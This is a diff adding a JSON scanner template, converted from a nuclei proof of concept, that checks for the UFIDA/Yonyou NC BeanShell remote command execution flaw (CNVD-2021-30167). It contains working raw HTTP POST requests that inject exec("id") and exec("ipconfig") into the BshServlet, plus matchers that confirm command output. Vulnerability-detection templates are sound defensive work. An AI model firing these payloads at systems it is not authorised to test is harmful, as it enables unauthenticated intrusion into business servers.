@@ -1,0 +1,177 @@
+{
+  "id": "CNVD-2021-30167",
+  "name": "UFIDA NC BeanShell Remote Command Execution",
+  "author": "pikpikcu",
+  "severity": "CRITICAL",
+  "description": "UFIDA NC BeanShell contains a remote command execution vulnerability in the bsh.servlet.BshServlet program.",
+  "references": [
+    "https://mp.weixin.qq.com/s/FvqC1I_G14AEQNztU0zn8A",
+    "https://www.cnvd.org.cn/webinfo/show/6491",
+    "https://chowdera.com/2022/03/202203110138271510.html"
+  ],
+  "tags": [
+    "cnvd2021",
+    "cnvd",
+    "beanshell",
+    "rce",
+    "yonyou"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-77",
+  "cvssScore": "10",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nbsh.script\u003dexec(\"id\");\n",
+        "POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nbsh.script\u003dexec(\"ipconfig\");\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "uid\u003d",
+            "Windows IP"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "WORD",
+          "part": "all",
+          "values": [
+            "BeanShell Test Servlet"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "CNVD-2021-30167",
+    "info": {
+      "name": "UFIDA NC BeanShell Remote Command Execution",
+      "author": "pikpikcu",
+      "severity": "critical",
+      "description": "UFIDA NC BeanShell contains a remote command execution vulnerability in the bsh.servlet.BshServlet program.",
+      "reference": [
+        "https://mp.weixin.qq.com/s/FvqC1I_G14AEQNztU0zn8A",
+        "https://www.cnvd.org.cn/webinfo/show/6491",
+        "https://chowdera.com/2022/03/202203110138271510.html"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "cvss_score": "10",
+        "cwe_id": "CWE-77"
+      },
+      "metadata": {
+        "max_request": 2
+      },
+      "tags": "cnvd2021,cnvd,beanshell,rce,yonyou"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nbsh.script\u003dexec(\"id\");\n",
+          "POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nbsh.script\u003dexec(\"ipconfig\");\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "uid\u003d",
+              "Windows IP"
+            ],
+            "condition": "or",
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "all",
+            "words": [
+              "BeanShell Test Servlet"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
